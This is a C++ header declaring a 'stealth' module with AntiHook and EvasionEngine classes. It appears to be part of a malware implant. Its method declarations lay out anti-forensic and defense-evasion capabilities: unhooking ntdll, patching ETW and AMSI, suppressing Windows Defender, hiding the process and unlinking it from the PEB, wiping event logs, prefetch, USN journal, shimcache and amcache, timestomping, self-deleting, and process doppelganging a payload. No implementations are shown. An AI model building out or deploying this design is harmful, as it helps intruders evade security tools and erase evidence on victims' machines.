#pragma once
#include <diarna/compiler_port.hpp>
#include <cstdint>
#include <string>
#include <vector>

namespace diarna::stealth {

class AntiHook {
public:
    static AntiHook& instance();

    bool detect_inline_hook(void* func_addr);
    bool detect_iat_hook(const wchar_t* dll, const char* func);
    bool detect_eat_hook(const wchar_t* dll, const char* func);
    bool detect_vmt_hook(void* obj);
    bool detect_hardware_bp();
    bool detect_veh_hook();
    bool detect_page_guard();

    uint32_t compute_func_hash(void* addr, size_t len);

    void unhook_ntdll();

    struct HookInfo {
        void* address = nullptr;
        std::string function_name;
        bool is_hooked = false;
        uint8_t first_bytes[16] = {};
        uint32_t expected_hash = 0;
        uint32_t actual_hash = 0;
    };
    std::vector<HookInfo> scan_all_critical();

private:
    AntiHook() = default;

    bool read_remote_memory(HANDLE proc, void* addr, void* buf, size_t size);
    uint32_t murmur3_32(const uint8_t* data, size_t len, uint32_t seed = 0x9747b28c);
};

class EvasionEngine {
public:
    static EvasionEngine& instance();

    bool hide_from_task_manager();
    bool mask_process_pid();
    bool clear_peb_debug_flag();
    bool unlink_from_peb();
    bool patch_etw();
    bool patch_amsi();
    bool disable_windows_defender_notify();
    bool clear_event_logs();
    bool clear_prefetch();
    bool timestomp_file(const wchar_t* path);
    bool clear_usn_journal();
    bool clear_shimcache();
    bool clear_amcache();
    bool clear_recent_files();
    bool clear_mui_cache();
    bool clear_bam_key();
    bool self_delete();
    bool process_doppelganging(const wchar_t* target, const wchar_t* payload);

    // Advanced evasion
    bool morph_process_name();
    bool block_dll_notification();
    bool unhook_loaded_dlls();
    bool redirect_api_calls();

private:
    EvasionEngine() = default;
};

} // namespace diarna::stealth
